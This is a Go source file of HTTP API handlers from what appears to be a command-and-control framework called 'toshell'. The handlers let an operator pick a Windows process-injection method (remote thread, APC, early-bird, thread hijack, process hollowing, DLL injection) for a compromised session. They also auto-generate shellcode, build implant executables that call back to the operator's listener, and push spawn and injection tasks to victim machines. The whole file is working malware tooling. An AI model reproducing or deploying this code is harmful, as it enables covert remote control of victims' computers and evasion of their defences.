package api

import (
	"encoding/base64"
	"encoding/json"
	"fmt"
	"net/http"

	"github.com/gorilla/mux"
	"toshell/internal/server/builder"
	"toshell/internal/server/logging"
	"toshell/internal/server/task"
)

type InjectionMethod struct {
	Name              string `json:"name"`
	Description       string `json:"description"`
	RequiresPID       bool   `json:"requires_pid"`
	RequiresPath      bool   `json:"requires_path"`
	RequiresShellcode bool   `json:"requires_shellcode"`
	RequiresDLL       bool   `json:"requires_dll"`
}

type InjectionRequest struct {
	Method            string `json:"method"`
	TargetPID         int    `json:"target_pid,omitempty"`
	TargetProcessName string `json:"target_process_name,omitempty"`
	TargetPath        string `json:"target_path,omitempty"`
	Shellcode         string `json:"shellcode,omitempty"`
	DLLPath           string `json:"dll_path,omitempty"`
	ParentPID         int    `json:"parent_pid,omitempty"`
}

func (s *Server) listInjectionMethodsHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")

	methods := []InjectionMethod{
		{
			Name:              "remote_thread",
			Description:       "远程线程注入 - 在目标进程中创建远程线程执行Shellcode",
			RequiresPID:       true,
			RequiresShellcode: true,
		},
		{
			Name:              "apc",
			Description:       "APC注入 - 将Shellcode排队到线程的APC队列",
			RequiresPID:       true,
			RequiresShellcode: true,
		},
		{
			Name:              "early_bird",
			Description:       "早期鸟APC注入 - 创建挂起进程并通过APC注入Shellcode",
			RequiresPath:      true,
			RequiresShellcode: true,
		},
		{
			Name:              "thread_hijack",
			Description:       "线程劫持 - 劫持目标进程中的现有线程执行Shellcode",
			RequiresPID:       true,
			RequiresShellcode: true,
		},
		{
			Name:              "process_hollowing",
			Description:       "进程空心化 - 创建合法进程，卸载其内存，替换为Shellcode",
			RequiresPath:      true,
			RequiresShellcode: true,
		},
		{
			Name:        "dll",
			Description: "DLL注入 - 通过LoadLibrary将DLL注入运行中的进程",
			RequiresPID: true,
			RequiresDLL: true,
		},
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"methods": methods,
		"count":   len(methods),
	})
}

func (s *Server) executeInjectionHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	sessionID := vars["id"]

	var req InjectionRequest
	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if req.Method == "" {
		http.Error(w, `{"error":"Injection method is required"}`, http.StatusBadRequest)
		return
	}

	cmdMap := map[string]interface{}{
		"method": req.Method,
	}

	if req.TargetPID > 0 {
		cmdMap["target_pid"] = req.TargetPID
	}
	if req.TargetProcessName != "" {
		cmdMap["target_process_name"] = req.TargetProcessName
	}
	if req.TargetPath != "" {
		cmdMap["target_path"] = req.TargetPath
	}
	if req.Shellcode != "" {
		sc := req.Shellcode
		if rewritten, err := s.rewriteShellcodeServerURL(sc, extractRequestHost(r)); err == nil {
			sc = rewritten
		}
		cmdMap["shellcode"] = sc
	}
	if req.DLLPath != "" {
		cmdMap["dll_path"] = req.DLLPath
	}
	if req.ParentPID > 0 {
		cmdMap["parent_pid"] = req.ParentPID
	}

	cmdJSON, err := json.Marshal(cmdMap)
	if err != nil {
		http.Error(w, `{"error":"Failed to build injection command"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.Create(sessionID, task.TaskParams{
		TaskType: task.TaskTypeInjection,
		Command:  string(cmdJSON),
		Data:     string(cmdJSON),
	})
	if err != nil {
		http.Error(w, fmt.Sprintf(`{"error":"%s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if s.listener != nil {
		if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
			logging.Error("api", "Failed to push injection task: %v", err)
			json.NewEncoder(w).Encode(map[string]interface{}{
				"task_id":   taskInfo.ID,
				"task_type": taskInfo.TaskType,
				"message":   "Injection task created but delivery pending: " + err.Error(),
			})
			return
		}
		logging.Info("api", "Injection task %d pushed to session %s: %s", taskInfo.ID, sessionID, req.Method)
	}

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"method":    req.Method,
		"message":   "Injection task pushed successfully",
	})
}

func (s *Server) processInjectHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	sessionID := vars["id"]

	var req struct {
		Method    string `json:"method"`
		PID       int    `json:"pid"`
		Shellcode string `json:"shellcode"`
		DLLPath   string `json:"dll_path"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if req.PID == 0 && req.Method != "spawn" {
		http.Error(w, `{"error":"Target PID is required for injection"}`, http.StatusBadRequest)
		return
	}

	if req.Method == "spawn" {
		session, err := s.sessionMgr.Get(sessionID)
		if err != nil {
			http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
			return
		}

		callbackHost := extractRequestHost(r)
		logging.Info("api", "[SPAWN] callbackHost=[%s] listenerPort=[%d]", callbackHost, s.cfg.Listener.Port)

		exeResult, err := s.builder.Build(builder.BuildOptions{
			OS:        session.Info.OS,
			Arch:      session.Info.Arch,
			Format:    "exe",
			ServerURL: func() string {
				host := callbackHost
				if host == "" || host == "0.0.0.0" {
					host = s.cfg.Listener.Host
				}
				if host == "" || host == "0.0.0.0" {
					host = s.cfg.Server.Host
				}
				scheme := "http"
				if s.cfg.Listener.TLSEnabled {
					scheme = "https"
				}
				return fmt.Sprintf("%s://%s:%d", scheme, host, s.cfg.Listener.Port)
			}(),
			Protocol:  s.cfg.Listener.Protocol,
			Interval:  s.cfg.Implant.Interval,
			Jitter:    s.cfg.Implant.Jitter,
			RetryWait: s.cfg.Implant.RetryWait,
		})
		if err != nil {
			logging.Error("api", "Failed to build EXE for spawn: %v", err)
			http.Error(w, fmt.Sprintf(`{"error":"Failed to build implant: %s"}`, err.Error()), http.StatusInternalServerError)
			return
		}

		exeB64 := base64.StdEncoding.EncodeToString(exeResult.Binary)
		logging.Info("api", "Built implant EXE for spawn: %d bytes", len(exeResult.Binary))

		if s.listener == nil {
			http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
			return
		}

		taskInfo, err := s.taskMgr.Create(sessionID, task.TaskParams{
			TaskType: "plugin_exe",
			Data:     exeB64,
			Command:  "",
		})
		if err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}

		if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
			http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
			return
		}

		logging.Info("api", "Spawn task pushed to session %s (plugin_exe, %d bytes)", sessionID, len(exeResult.Binary))

		json.NewEncoder(w).Encode(map[string]interface{}{
			"task_id":            taskInfo.ID,
			"task_type":          "plugin_exe",
			"method":             "spawn",
			"pid":                req.PID,
			"message":            "Process injection task pushed",
			"shellcode_generated": true,
		})
		return
	}

	shellcode := req.Shellcode
	shellcodeAutoGenerated := false
	if shellcode == "" && req.DLLPath == "" {
		session, err := s.sessionMgr.Get(sessionID)
		if err != nil {
			http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
			return
		}

		callbackHost := extractRequestHost(r)
		logging.Info("api", "[INJECT] r.Host=[%s] callbackHost=[%s] port=[%d]", r.Host, callbackHost, s.cfg.Listener.Port)

		shellcodeResult, err := s.builder.GenerateQuickShellcode(session.Info.OS, session.Info.Arch, callbackHost)
		if err != nil {
			logging.Error("api", "Failed to generate shellcode: %v", err)
			http.Error(w, fmt.Sprintf(`{"error":"Failed to generate shellcode: %s"}`, err.Error()), http.StatusInternalServerError)
			return
		}
		if shellcodeResult.ShellcodeBase64 == "" {
			http.Error(w, `{"error":"Shellcode generation returned empty result"}`, http.StatusInternalServerError)
			return
		}
		shellcode = shellcodeResult.ShellcodeBase64
		shellcodeAutoGenerated = true
		logging.Info("api", "Generated shellcode: %d bytes", len(shellcodeResult.Shellcode))
	} else if shellcode != "" {
		callbackHost := extractRequestHost(r)
		if rewritten, err := s.rewriteShellcodeServerURL(shellcode, callbackHost); err == nil {
			shellcode = rewritten
		}
	}

	if req.DLLPath == "" && shellcode == "" {
		http.Error(w, `{"error":"Shellcode is required for non-DLL injection"}`, http.StatusBadRequest)
		return
	}

	if s.listener == nil {
		http.Error(w, `{"error":"Listener not available"}`, http.StatusInternalServerError)
		return
	}

	taskInfo, err := s.taskMgr.CreateProcessInject(sessionID, req.Method, req.PID, shellcode, req.DLLPath)
	if err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
		http.Error(w, `{"error":"`+err.Error()+`"}`, http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Process injection pushed to session %s, PID: %d, Method: %s", sessionID, req.PID, req.Method)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":             taskInfo.ID,
		"task_type":           taskInfo.TaskType,
		"pid":                 req.PID,
		"method":              req.Method,
		"shellcode_generated": shellcodeAutoGenerated,
		"message":             "Process injection task pushed",
	})
}

func (s *Server) autoInjectHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	sessionID := vars["id"]

	var req struct {
		PID    int    `json:"pid"`
		Method string `json:"method"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	if req.PID == 0 {
		http.Error(w, `{"error":"Target PID is required"}`, http.StatusBadRequest)
		return
	}

	if req.Method == "" {
		req.Method = "remote_thread"
	}

	sess, err := s.sessionMgr.Get(sessionID)
	if err != nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}

	shellcodeResult, err := s.builder.GenerateQuickShellcode(sess.Info.OS, sess.Info.Arch, extractRequestHost(r))
	if err != nil {
		logging.Error("api", "Failed to generate shellcode: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"Failed to generate shellcode: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Generated shellcode for auto injection: %d bytes", len(shellcodeResult.Shellcode))

	autoInjectData := map[string]interface{}{
		"target_pid": req.PID,
		"method":     req.Method,
		"shellcode":  shellcodeResult.ShellcodeBase64,
		"auto_mode":  true,
	}

	dataJSON, _ := json.Marshal(autoInjectData)

	taskInfo, err := s.taskMgr.Create(sessionID, task.TaskParams{
		TaskType: task.TaskTypeAutoInject,
		Data:     string(dataJSON),
	})

	if err != nil {
		logging.Error("api", "Failed to create auto inject task: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"Failed to create task: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if s.listener != nil {
		if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
			logging.Error("api", "Failed to push auto inject task: %v", err)
			http.Error(w, `{"error":"Failed to dispatch task"}`, http.StatusInternalServerError)
			return
		}
	}

	logging.Info("api", "Auto injection task pushed to session %s, PID: %d, Method: %s", sessionID, req.PID, req.Method)

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":       taskInfo.ID,
		"task_type":     taskInfo.TaskType,
		"target_pid":    req.PID,
		"method":        req.Method,
		"message":       "Auto injection task pushed successfully",
		"shellcode_size": len(shellcodeResult.Shellcode),
	})
}

func (s *Server) spawnHandler(w http.ResponseWriter, r *http.Request) {
	w.Header().Set("Content-Type", "application/json")
	vars := mux.Vars(r)
	sessionID := vars["id"]

	var req struct {
		FileName string `json:"file_name"`
	}

	if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
		http.Error(w, `{"error":"Invalid request body"}`, http.StatusBadRequest)
		return
	}

	sess, err := s.sessionMgr.Get(sessionID)
	if err != nil {
		http.Error(w, `{"error":"Session not found"}`, http.StatusNotFound)
		return
	}

	buildResult, err := s.builder.Build(builder.BuildOptions{
		OS:        sess.Info.OS,
		Arch:      sess.Info.Arch,
		Format:    "exe",
		ServerURL: extractRequestHost(r),
	})
	if err != nil {
		logging.Error("api", "Failed to build implant for spawn: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"Failed to build implant: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	logging.Info("api", "Built implant for spawn: %d bytes", len(buildResult.Binary))

	exeBase64 := base64.StdEncoding.EncodeToString(buildResult.Binary)

	spawnData := map[string]interface{}{
		"exe_data":  exeBase64,
		"file_name": req.FileName,
	}

	dataJSON, _ := json.Marshal(spawnData)

	taskInfo, err := s.taskMgr.Create(sessionID, task.TaskParams{
		TaskType: task.TaskTypeSpawn,
		Data:     string(dataJSON),
	})

	if err != nil {
		logging.Error("api", "Failed to create spawn task: %v", err)
		http.Error(w, fmt.Sprintf(`{"error":"Failed to create task: %s"}`, err.Error()), http.StatusInternalServerError)
		return
	}

	if s.listener != nil {
		if err := s.listener.PushTask(sessionID, taskInfo); err != nil {
			logging.Error("api", "Failed to push spawn task: %v", err)
			http.Error(w, `{"error":"Failed to dispatch task"}`, http.StatusInternalServerError)
			return
		}
	}

	logging.Info("api", "Spawn task pushed to session %s, EXE size: %d bytes", sessionID, len(buildResult.Binary))

	json.NewEncoder(w).Encode(map[string]interface{}{
		"task_id":   taskInfo.ID,
		"task_type": taskInfo.TaskType,
		"message":   "Spawn task pushed successfully",
		"exe_size":  len(buildResult.Binary),
		"file_name": req.FileName,
	})
}
